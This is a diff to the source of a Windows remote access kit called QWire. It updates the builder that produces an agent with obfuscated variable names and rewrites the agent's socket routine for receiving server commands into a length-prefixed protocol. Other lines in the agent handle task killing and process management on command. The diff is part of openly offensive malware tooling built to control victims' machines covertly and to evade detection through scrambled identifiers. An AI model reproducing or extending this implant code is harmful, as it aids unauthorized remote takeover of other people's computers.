@@ -10,7 +10,7 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.1
+# Build:  1.0.2
 # -------------------------------------------------------------
 from ..builder.encryption import Scrambler
 from ..logging.logging import LoggingUtilitys
@@ -147,6 +147,8 @@ class QWireAgent():
         kill_task = Scrambler().scrambleVar(self.variable_length)
         process_manager = Scrambler().scrambleVar(self.variable_length)
         term_process = Scrambler().scrambleVar(self.variable_length)
+        initial_data = Scrambler().scrambleVar(self.variable_length)
+        data_size = Scrambler().scrambleVar(self.variable_length)
         agent_source = f"""
 import socket as socket
 import base64 as base64
@@ -324,13 +326,20 @@ class {ClientSocket}:
             if {action_flag} == self.{term_process}:                                      
                 {SystemManager}().{kill_task}({server_command}[1])                                  
     def {recv_all_data}(self):
-        {bytes_data} = b''                             
-        while True:                                 
-            {partial_data} = self.{client_socket}.recv({BUFFER}) 
-            {bytes_data} += {partial_data}                 
-            if len({partial_data}) < int({BUFFER}):        
-                break                                   
-        return {bytes_data}                           
+        try:
+            {bytes_data} = b''
+            {initial_data} = self.{client_socket}.recv({BUFFER})              
+            {data_size} = {initial_data}.split('|'.encode())             
+            if len({initial_data}) < int(str({data_size}[0].decode())):      
+                {bytes_data}+={data_size}[1]                     
+                while len({bytes_data}) != int(str({data_size}[0].decode())):   
+                    {partial_data} = self.{client_socket}.recv({BUFFER})          
+                    {bytes_data} += {partial_data}                              
+                return {bytes_data}                                           
+            else:                                                           
+                return {data_size}[1]
+        except ValueError:
+            return self.{connect_to_server}()                                                        
     def {receive_server_command}(self):
         {data} = self.{recv_all_data}()         
         if not {data}:                            
